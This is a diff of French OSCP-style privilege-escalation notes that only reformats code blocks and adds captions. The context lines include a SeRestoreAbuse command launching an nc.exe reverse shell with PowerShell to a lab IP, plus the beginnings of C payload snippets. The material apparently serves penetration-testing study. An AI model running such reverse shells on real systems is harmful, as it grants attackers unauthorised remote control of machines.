@@ -351,7 +351,9 @@ Examiner les objets, les droits et les services du domaine.
 
 
 
-```text
+<p class="oscp-command-note">Commande Windows : .\SeRestoreAbuse.exe</p>
+
+```powershell
 .\SeRestoreAbuse.exe "C:\temp\nc.exe 192.168.49.194 445 -e powershell.exe"
 
 ```
@@ -852,7 +854,9 @@ Observer les permissions et la configuration de Windows.
 
 
 
-```text
+<p class="oscp-command-note">Extrait de code C</p>
+
+```c
 #include <stdlib.h>
 
 int main ()
@@ -867,7 +871,9 @@ int main ()
 
 
 
-```text
+<p class="oscp-command-note">Extrait de code C</p>
+
+```c
 #include <windows.h>  
 #include <stdlib.h>  
 
